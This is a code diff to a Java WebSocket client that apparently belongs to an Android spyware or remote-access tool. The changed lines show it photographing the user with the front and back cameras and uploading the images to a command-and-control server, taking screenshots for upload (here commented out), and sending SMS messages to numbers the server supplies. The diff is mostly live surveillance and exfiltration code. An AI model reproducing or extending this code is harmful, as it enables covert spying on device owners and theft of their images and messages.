@@ -59,7 +59,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     break;
                 case CAMERA_BACK:
                     path = Screenshot.captureImage(context, false);
-                    data = getFileContent(path);
                     file = new File(path);
 
                     FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/images");
@@ -71,7 +70,6 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     break;
                 case CAMERA_FRONT:
                     path = Screenshot.captureImage(context, true);
-                    data = getFileContent(path);
                     file = new File(path);
 
                     FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/images");
@@ -116,16 +114,16 @@ public class WebSocketClient extends org.java_websocket.client.WebSocketClient {
                     send(json.toString());
                     break;
                 case SCREENSHOT:
-                    path = Screenshot.captureScreen(context);
-                    data = getFileContent(path);
-                    file = new File(path);
-
-                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/screenshots");
-
-                    json.put("res", "screenshot");
-                    json.put("filename", file.getName());
-                    json.put("timestamp", file.getName().split(".")[0]);
-                    send(json.toString());
+//                    path = Screenshot.captureScreen();
+//                    data = getFileContent(path);
+//                    file = new File(path);
+//
+//                    FileManager.uploadFile(file.getAbsolutePath(), Utils.C2_SERVER + "/screenshots");
+//
+//                    json.put("res", "screenshot");
+//                    json.put("filename", file.getName());
+//                    json.put("timestamp", file.getName().split(".")[0]);
+//                    send(json.toString());
                     break;
                 case TEXT:
                     SMS.send(req.getString("number"), req.getString("message"));
